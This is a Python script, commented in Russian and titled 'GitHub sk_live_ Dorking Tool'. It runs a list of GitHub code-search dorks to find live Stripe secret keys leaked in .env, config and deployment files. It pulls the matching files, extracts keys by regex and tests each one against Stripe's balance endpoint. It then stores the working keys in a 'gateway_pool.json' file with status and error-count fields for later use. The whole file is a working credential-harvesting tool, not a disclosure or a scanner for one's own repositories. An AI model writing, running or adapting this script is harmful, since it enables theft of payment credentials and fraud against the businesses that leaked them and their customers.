import os
import time
import json
import re
import requests
from urllib.parse import urlparse
from pathlib import Path

# Файл с пулом валидных ключей
POOL_FILE = Path(__file__).parent / "gateway_pool.json"

# GitHub API имеет строгие ограничения:
# Search API: 10 запросов в минуту для авторизованных пользователей.
# Core API (загрузка файлов): 5000 запросов в час.

QUERIES = [
    '"sk_live_" filename:.env',
    '"sk_live_" filename:wp-config.php',
    '"sk_live_" filename:config.php',
    '"STRIPE_SECRET_KEY sk_live_" filename:.env',
    '"sk_live_" filename:docker-compose',
    '"sk_live_" filename:settings.json',
    '"sk_live_" path:woocommerce',
    # Round 2: more specific patterns
    '"sk_live_51" filename:.env',           # Stripe Connect accounts start with 51
    '"sk_live_" filename:.env.local',
    '"sk_live_" filename:.env.production',
    '"sk_live_" filename:.env.staging',
    '"sk_live_" filename:constants.php',
    '"sk_live_" filename:parameters.yml',
    '"sk_live_" filename:secrets.yml',
    '"sk_live_" filename:application.yml',
    '"sk_live_" filename:application.properties',
    '"sk_live_" filename:.env.prod',
    '"sk_live_" filename:credentials.json',
    '"sk_live_" filename:serviceAccount.json',
    '"STRIPE_PRIVATE" sk_live filename:.env',
    '"stripe_secret" sk_live filename:.env',
    '"sk_live_" filename:config.yml',
    '"sk_live_" filename:config.yaml',
    '"sk_live_" filename:heroku.yml',
    '"sk_live_" filename:vercel.json',
    '"sk_live_" filename:netlify.toml',
    '"sk_live_" filename:railway.json',
]

def load_pool():
    if POOL_FILE.exists():
        try:
            return json.loads(POOL_FILE.read_text(encoding="utf-8"))
        except:
            return []
    return []

def save_pool(pool):
    POOL_FILE.write_text(json.dumps(pool, ensure_ascii=False, indent=2), encoding="utf-8")

def check_sk_key(sk_key):
    """Проверка ключа на валидность через Stripe API (получение баланса)"""
    print(f"    [*] Проверяем ключ: {sk_key[:12]}...")
    try:
        r = requests.get("https://api.stripe.com/v1/balance",
            headers={
                "Authorization": f"Bearer {sk_key}", 
                "Accept": "application/json", 
                "Stripe-Version": "2023-10-16"
            },
            timeout=10)
        
        if r.status_code == 200:
            data = r.json()
            available = data.get("available", [])
            print(f"    [★★★] VALID sk! Баланс: {available}")
            return True
        else:
            err = r.json().get("error", {}).get("message", "")[:60]
            print(f"    [-] sk невалидный: {err}")
            return False
    except Exception as e:
        print(f"    [-] Ошибка при проверке sk: {e}")
        return False

def handle_rate_limit(response, is_search=False):
    """Проверяет заголовки Rate Limit и делает паузу, если лимит исчерпан."""
    if response.status_code == 403 and "X-RateLimit-Remaining" in response.headers:
        remaining = int(response.headers.get("X-RateLimit-Remaining", 1))
        if remaining == 0:
            reset_time = int(response.headers.get("X-RateLimit-Reset", time.time()))
            sleep_time = max(0, reset_time - time.time())
            print(f"  [!] Достигнут лимит API. Пауза {sleep_time:.0f} секунд до сброса лимита...")
            time.sleep(sleep_time + 5)
            return True # Rate limit был обработан
    elif response.status_code == 429:
        # Secondary rate limit
        retry_after = int(response.headers.get("Retry-After", 60))
        print(f"  [!] Сработал Secondary Rate Limit. Пауза {retry_after} секунд...")
        time.sleep(retry_after)
        return True
    return False

def search_github(query, token):
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "Authorization": f"Bearer {token}",
        "X-GitHub-Api-Version": "2022-11-28"
    }
    
    url = "https://api.github.com/search/code"
    params = {
        "q": query,
        "per_page": 20 # Забираем по 20 результатов, чтобы не перегружать загрузку файлов
    }
    
    print(f"\n[Поиск] Запрос: {query}")
    
    while True:
        try:
            response = requests.get(url, headers=headers, params=params, timeout=15)
        except requests.exceptions.RequestException as e:
            print(f"  [-] Ошибка сети при поиске: {e}")
            return []
            
        if handle_rate_limit(response, is_search=True):
            continue # Повторяем запрос после паузы
            
        if response.status_code != 200:
            print(f"  [-] Ошибка поиска. Код: {response.status_code}")
            try:
                print(f"      Детали: {response.json().get('message')}")
            except:
                pass
            return []
            
        data = response.json()
        items = data.get("items", [])
        print(f"  [+] Найдено файлов: {len(items)}")
        return items

def get_raw_file_content(item, token):
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github.v3.raw" # Получаем чистый контент (raw)
    }
    
    file_url = item['url'] # Это API URL файла
    
    while True:
        try:
            response = requests.get(file_url, headers=headers, timeout=15)
        except requests.exceptions.RequestException as e:
            print(f"  [-] Ошибка сети при загрузке файла: {e}")
            return ""
            
        if handle_rate_limit(response):
            continue
            
        if response.status_code == 200:
            return response.text
        else:
            print(f"  [-] Не удалось загрузить файл, код {response.status_code}")
            return ""

def main():
    print("=" * 60)
    print(" GitHub sk_live_ Dorking Tool")
    print("=" * 60)
    
    # Пытаемся получить токен из окружения
    token = os.environ.get("GITHUB_TOKEN", "").strip()
    if not token:
        token = input("Введите ваш GitHub Personal Access Token (или нажмите Enter, если есть в .env): ").strip()
        
    if not token:
        print("[-] Ошибка: Для поиска кода необходим GitHub токен.")
        print("Создайте его тут: https://github.com/settings/tokens (галочки можно не ставить).")
        return
        
    pool = load_pool()
    found_keys = set()
    
    # Собираем уже известные ключи из пула, чтобы не проверять их дважды
    for item in pool:
        if item.get("sk_key"):
            found_keys.add(item.get("sk_key"))

    initial_found = len(found_keys)

    for i, query in enumerate(QUERIES):
        items = search_github(query, token)
        
        for item in items:
            repo_name = item['repository']['full_name']
            file_path = item['path']
            html_url = item['html_url']
            
            print(f"  > Анализ: {repo_name}/{file_path}")
            
            content = get_raw_file_content(item, token)
            if not content:
                continue
                
            # Ищем все вхождения sk_live_
            matches = re.findall(r'sk_live_[0-9a-zA-Z]{24,}', content)
            
            if matches:
                for match in set(matches):
                    if match not in found_keys:
                        print(f"    [★] Найден потенциальный ключ: {match[:15]}... в {html_url}")
                        
                        is_valid = check_sk_key(match)
                        if is_valid:
                            # Сохраняем в пул
                            pool.append({
                                "url": html_url,
                                "pk_key": "",
                                "sk_key": match,
                                "tokenization": "sk_valid",
                                "status": "active",
                                "error_count": 0,
                                "check_count": 0,
                                "note": f"sk найден на GitHub: {repo_name}"
                            })
                            save_pool(pool)
                            found_keys.add(match)
                        else:
                            # Добавляем в сет, чтобы не проверять невалидный ключ еще раз
                            found_keys.add(match)
            
            # Пауза между файлами (для безопасности от вторичных лимитов GitHub)
            time.sleep(1)
            
        # Строгий лимит на Code Search: 10 запросов в минуту. 
        # Добавляем паузу между dorks.
        if i < len(QUERIES) - 1:
            print("  [~] Пауза 8 секунд для обхода Rate Limit GitHub Search API...")
            time.sleep(8)
            
    new_keys_found = len(found_keys) - initial_found
    print(f"\n[Готово] Поиск завершен. Найдено новых валидных ключей в этой сессии: {new_keys_found}")

if __name__ == "__main__":
    main()
